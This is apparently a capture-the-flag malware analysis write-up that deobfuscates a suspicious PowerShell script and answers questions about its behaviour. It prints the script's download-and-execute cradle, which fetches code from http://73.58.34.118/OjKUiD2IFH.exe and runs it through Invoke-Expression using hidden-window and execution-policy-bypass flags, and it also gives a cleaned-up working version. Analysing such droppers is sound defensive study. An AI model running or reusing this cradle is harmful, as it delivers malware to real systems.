---
title: Powershell Enigma
time: 2024-09-17
categories: [malware analysis]
tags: [easy, malware, ps1]
image: /assets/posts/chall_category/malware-analysis.png
---

## Description:

A suspicious PowerShell script was found on a compromised system. Your task is to analyze the script, determine its functionality, and answer questions about its behavior.

- Category: Malware Analysis
- **No Flag** (Question and Answer basis)
- Password for challenge file: `infected`

<button onclick="downloadFile()">Download File</button>

<script>
function downloadFile() {
    const link = document.createElement('a');
    link.href = 'https://github.com/0x251e/challenges/raw/main/union-depository/malware-analysis/powershell-enigma/sus.zip';
    link.download = 'sus.zip';
    link.click();
}
</script>


## Questions:

> 1. What is the main purpose of this script?
> 2. What command is used to execute the final payload?
> 3. What is the URL from which additional code is downloaded?
> 4. How does the script attempt to evade detection? List at least two methods.
> 5. What PowerShell flags are used when executing the encoded command, and what do they do?
> 6. Rewrite the script in a de-obfuscated form.

## Solutions:

To analyze we replace a new line after a semicolon `;`, as in powershell is a statement separator. 

```powershell
$x=''
$y='IEX'
$z='powershell.exe -w h -ep b -e '

$a=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('$c="http://73.58.34.118/OjKUiD2IFH.exe"
$w=New-Object Net.WebClient
$d=$w.DownloadString($c)
IEX $d'))

$b=$y+" "+$z+$a
$x=$b|IEX
```

Now we could break down each parts individually
```powershell
$x=''                                   # initialized empty string
$y='IEX'                                # set to Invoke-Expression
$z='powershell.exe -w h -ep b -e '      # call powershell with options 

$a=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('$c="http://73.58.34.118/OjKUiD2IFH.exe"                       # convert base64 string to unicode byte 
$w=New-Object Net.WebClient             # initialized to download 
$d=$w.DownloadString($c)                # download from $c which is the payload
IEX $d'))                               # Invoke-Expression of the download

$b=$y+" "+$z+$a                         # Putting the pieces together into variable b
$x=$b|IEX                               # Run constructed command of b then passed to Invoke-Expression
```

Hold your horses before start answering those questions, I yet explain the options parameter invoked
- `-w h`: Shortform for `-WindowStyle Hidden`
- `-ep b`: Shortform for `-ExecutionPolicy Bypass` 
- `-e`: Shortform for `-EncodedCommand`

Back to the questions

###### 1. What is the main purpose of this script?

Based on our analysis, the main purpose of this script is to download a dropper malware and then execute it from the IP address of 73.58.34.118 and the dropper malware is OjKUiD2IFH.exe

###### 2. What command is used to execute the final payload?

To execute the dropper malware, it used `Invoke-Expression` as `IEX`

###### 3. What is the URL from which additional code is downloaded?

The URL is http://73.58.34.118/OjKUiD2IFH.exe

###### 4. How does the script attempt to evade detection? List at least two methods.

The script can evade detection by base64 encoded string and having the powershell to execute with bypass execution policy

###### 5. What PowerShell flags are used when executing the encoded command, and what do they do?

`-w h`: Shortform for `-WindowStyle Hidden`
`-ep b`: Shortform for `-ExecutionPolicy Bypass` 
`-e`: Shortform for `-EncodedCommand`

###### 6. Rewrite the script in a de-obfuscated form.

```powershell
$url="http://73.58.34.118/OjKUiD2IFH.exe"
$client= New-Object Net.WebClient
$dropper= $client.DownloadString($url)
Invoke-Expression $dropper 
```

References:
- [https://ss64.com/ps/powershell.html](https://ss64.com/ps/powershell.html)
- [https://github.com/ab14jain/PowerShell](https://github.com/ab14jain/PowerShell)

